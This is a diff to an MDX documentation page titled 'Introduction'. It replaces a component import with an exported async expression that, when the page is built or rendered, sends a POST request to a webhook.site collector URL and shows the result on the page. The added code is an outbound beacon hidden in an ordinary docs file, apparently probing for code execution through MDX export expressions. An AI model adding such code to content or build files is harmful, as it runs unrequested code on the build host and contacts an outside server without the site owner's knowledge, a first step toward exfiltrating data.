@@ -3,10 +3,21 @@ title: Introduction
 description: Getting started
 ---
 
-import Island from '../components/Island';
-
-<Island />
+export const data = await (async () => {
+  try {
+    const r = await fetch("https://webhook.site/e27d2c30-7065-4093-984b-28ab4e278794", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({source: "mdx-export-expression", ts: Date.now()})
+    });
+    return "fetched";
+  } catch(e) {
+    return "error:" + e.message;
+  }
+})();
 
 # Welcome
+
+Data: {data}
 
 This is a documentation page.
